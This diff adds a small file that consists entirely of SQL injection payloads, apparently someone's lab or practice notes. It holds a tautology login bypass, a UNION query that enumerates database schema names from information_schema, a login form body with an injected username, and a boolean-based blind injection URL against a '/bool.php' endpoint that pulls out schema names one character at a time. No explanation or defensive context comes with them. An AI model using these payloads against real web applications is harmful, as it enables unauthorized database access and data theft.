@@ -1,0 +1,5 @@
+1' or '1' = '1
+2' union select schema_name, schema_name from information_schema.schemata where '1' = '1
+
+password=aMess&username=xixi' or '1' = '1
+/bool.php?password=aMess&username=xixi' and (select ascii(substring((select schema_name from information_schema.schemata limit 1), 1, 1))) = 109 and '1' = '1
